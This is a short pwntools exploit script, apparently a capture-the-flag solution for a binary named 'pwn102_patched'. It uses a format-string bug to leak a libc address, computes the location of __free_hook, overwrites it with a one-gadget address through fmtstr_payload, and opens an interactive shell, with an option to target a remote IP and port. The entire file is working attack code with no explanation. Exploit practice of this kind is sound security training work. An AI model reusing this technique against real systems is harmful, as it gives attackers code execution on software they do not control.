#!/usr/bin/python3

from pwn import *
import sys

elf = context.binary = ELF('./pwn102_patched')
libc = ELF("./libc.so.6")
# context.log_level = 'debug'

gdb_script ="""
b *main+191
continue
"""

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gdb_script)
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2]) #ip / port
    else:
        return process(elf.path)
p = start()

def echo(message):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"echo> ", message)

def leave():
    p.sendlineafter(b"> ", b"2")

oneshot = 0x4f302
# oneshot = 0x4f29e 0x4f2a5 0x4f302 0x10a2fc

echo(b"%3$p")
libc_base = int(p.recvline().strip().decode(), 16) - libc.symbols["read"] - 17
free_hook = libc_base + libc.symbols["__free_hook"]
oneshot = libc_base + oneshot 

success(f"LIBC Leak: {hex(libc_base)}") 
success(f"Free Hook: {hex(free_hook)}") 
success(f"One Gadget: {hex(oneshot)}") 

payload = fmtstr_payload(10, {free_hook: oneshot})
echo(payload)

p.interactive()